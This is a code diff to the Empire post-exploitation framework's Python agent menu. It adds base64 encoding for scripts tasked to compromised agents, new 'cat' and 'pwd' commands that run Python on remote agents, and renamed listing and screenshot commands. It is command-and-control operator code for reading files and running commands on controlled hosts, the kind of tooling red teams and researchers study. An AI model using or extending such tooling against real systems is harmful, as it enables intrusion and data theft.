@@ -21,6 +21,9 @@ import hashlib
 import time
 import fnmatch
 import shlex
+import pkgutil
+import importlib
+import base64
 
 # Empire imports
 import helpers
@@ -2589,10 +2592,10 @@ class PythonAgentMenu(SubMenu):
             open_file.close()
             script = script.replace('\r\n', '\n')
             script = script.replace('\r', '\n')
-
+            encScript = base64.b64encode(script)
             msg = "[*] Tasked agent to execute python script: "+filename
             print helpers.color(msg, color="green")
-            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", script)
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SCRIPT_COMMAND", encScript)
             #update the agent log
             self.mainMenu.agents.save_agent_log(self.sessionID, msg)
         else:
@@ -2692,7 +2695,7 @@ class PythonAgentMenu(SubMenu):
             self.mainMenu.modules.search_modules(searchTerm)
 
     def do_sc(self, line):
-        "Use pyobjc and Foundation libraries to take a screenshot, and save the image to the server"
+        "Use the python-mss module to take a screenshot, and save the image to the server. Not opsec safe"
 
         if self.mainMenu.modules.modules['python/collection/osx/native_screenshot']:
             module = self.mainMenu.modules.modules['python/collection/osx/native_screenshot']
@@ -2706,23 +2709,53 @@ class PythonAgentMenu(SubMenu):
         else:
             print helpers.color("[!] python/collection/osx/screenshot module not loaded")
 
-    def do_ls(self, line):
+    def do_ls_m(self, line):
         "List directory contents at the specified path"
         #http://stackoverflow.com/questions/17809386/how-to-convert-a-stat-output-to-a-unix-permissions-string
-        if self.mainMenu.modules.modules['python/management/osx/ls']:
-            module = self.mainMenu.modules.modules['python/management/osx/ls']
+        if self.mainMenu.modules.modules['python/management/osx/ls_m']:
+            module = self.mainMenu.modules.modules['python/management/osx/ls_m']
             if line.strip() != '':
                 module.options['Path']['Value'] = line.strip()
 
             module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
-            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/ls')
+            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/ls_m')
             msg = "[*] Tasked agent to list directory contents of: "+str(module.options['Path']['Value'])
             print helpers.color(msg,color="green")
             self.mainMenu.agents.save_agent_log(self.sessionID, msg)
             module_menu.do_execute("")
 
         else:
-            print helpers.color("[!] python/management/osx/ls module not loaded")
+            print helpers.color("[!] python/management/osx/ls_m module not loaded")
+
+    def do_cat(self, line):
+        "View the contents of a file"
+
+        if line != "":
+
+            cmd = """
+try:
+    output = ""
+    with open("%s","r") as f:
+        for line in f:
+            output += line
+    
+    print output
+except Exception as e:
+    print str(e)
+""" % (line)
+            # task the agent with this shell command
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", str(cmd))
+            # update the agent log
+            msg = "Tasked agent to cat file %s" % (line)
+            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+
+    def do_pwd(self, line):
+        "Print working directory"
+
+        command = "cwd = os.getcwd(); print cwd"
+        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", command)
+        msg = "Tasked agent to print current working directory"
+        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
 
     def do_whoami(self, line):
         "Print the currently logged in user"
